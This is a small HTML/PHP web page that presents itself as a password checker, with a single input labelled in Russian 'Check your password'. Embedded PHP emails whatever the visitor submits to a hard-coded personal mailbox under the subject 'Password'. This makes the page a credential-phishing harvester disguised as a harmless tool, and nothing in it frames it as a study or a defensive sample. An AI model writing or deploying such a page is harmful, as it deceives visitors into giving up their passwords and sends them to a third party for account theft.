<!DOCTYPE html>
<html>
<link rel="stylesheet" type="text/css" href="css/style.css">
<head>
	<meta charset="utf-8">
	<title>youcline</title>
</head>
<body>

	<div class="content">
		<div class="logo">
			<img src="img/logo.png">
		</div>
	</div>
	<form action="./mail.php" method="post" class="search">
	<input type="search" name="name" placeholder="Проверь пароль" class="input" />
	<input type="submit" name="" value="" class="submit" />
</form>	
 <?php
$to = "sisimanhyhy@gmail.com"; 
$tema = "Пароль"; 
$message = "Ваше имя: ".$_POST['name']."<br>";
$message .= "E-mail: ".$_POST['email']."<br>"; 
$headers  = 'MIME-Version: 1.0' . "\r\n"; 
$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n"; 
mail($to, $tema, $message, $headers);
?>
</body>
</html>